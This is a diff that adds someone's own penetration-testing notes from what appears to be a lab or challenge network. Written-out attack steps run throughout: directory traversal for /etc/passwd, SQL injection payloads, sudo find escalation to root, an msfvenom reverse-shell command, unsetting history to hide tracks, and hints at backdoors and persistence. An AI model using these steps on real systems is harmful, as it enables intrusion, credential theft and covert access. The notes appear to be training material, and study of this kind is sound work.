@@ -1088,3 +1088,35 @@ find a suppicious file to use when doing the suid and sgid lookup, cd into the d
 to find other websites look in /etc/host
 http://10.50.42.36/getcareers.php?myfile=../../../../etc/hosts
 ```
+# Test notes
+```
+10.50.42.36 had a website and ssh. by using a --script=http-enum found a script that had a user and was able to log into the box with user2, ip neighbor gave jack shit so look into /etc/hosts to find other boxes.
+192.168.28.181 was just webserver that we used sql injection from radio buttons to exploit. by using the golden rule we were able to see all user credentials for the rest of this challenge. there was no ssh users to log onto.
+192.168.28.172 found user Aaron to log in to the box from the 181 using sql injection. when i got onto the box i used sudo -l to see permissions and found that the /bin/find command was available with no password. form there i used sudo find . -exec /bin/sh \; -quit to get root permissions. Using passwd i changed the password to 12345QWERT!@.
+When getting on a box make sure to run for i in {97..130}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done, this will find what other devices are in the network from enumerating /etc/host or ip neighbor
+getting onto a windows using msfvenom, run msfvenom -p windows/shell/reverse_tcp lhost=10.50.27.207 lport=10006 -b "\x00" -f python and grab everything but the buf = b"" line and paste it into the script, set up msfconsole and run it to wait for the connection to go through, once connection is good go to /Users and see what users we have creds for then move onto making another ssh tunnel to the box, use xfreerdp /v:127.0.0.1:10402 /u:Lroth /glyph-cache /clipboard /dynamic-resolution to log in then enter password.
+
+First target exploit nmap scan for what is available on system, then --script= http-enum to see what is available. Go to website and open all the tabs and see what is on the website to exploit or flags. If a login page try ' OR 1='1 in both fields and look at the post request and copy and paste into the search bar with a ? at the end of the original html and it should spit out passwords. View page source for easier viewing. go to the other pages and see what we can exploit. use ; to try and break the cat page for command injection, try ../../../../etc/passwd (shows who has a shell)(directory traversal) or hint hint ../../../../etc/hosts for other machines. Create a master socket to the box and log on from the creds found. Unset histfile and run a ping sweep and copy down ips we get. Create a dynamic tunnel to use proxychains to nmap the ips we got. you can use 192.168.28.172,181 with nmap to scan ips. Check ports with proxychains nc. create tunnels to the ips have to use multiple -L when making tunnels to two ports or more. Use firefox to log onto new website
+
+Exploiting radio buttons
+go through every single button and see which one allows us to exploit using <URL>? OR 1=1, verify how many fields by doing union select 1,2,3 to see how it gets displayed, see if more info can get displayed by adding more numbers, then golden rule to see user created databases, use the golden rule as a template to put in the information gathered to enumerate the system, make sure to break it out to look through everything, read the questions to see if you are done with the box
+
+# Using creds found and priv esc
+create master socket to new ip with the creds and make sure to run sudo -l. If sudo shows something we can use to priv esc use it, if not use the find / whatever command to look for weird software to be able to use to priv escalate. Look through all the stuff and enumerate and can create backdoor or persistance, run ip neigh or /etc/hosts to find other devices, create dynamic tunnel to nmap the hosts to see whats available on the devices found
+
+# Windows exploit
+listen on nc to ports and see if buffer overflow can be conducted, run through the steps and boom on device
+```
+
+
+
+
+
+
+
+
+# good nmap scripts
+```
+nmap --script http-enum <IP>
+nmap -Pn -T5 -sT -p 80 --script http-sql-injection.nse <IP>
+```
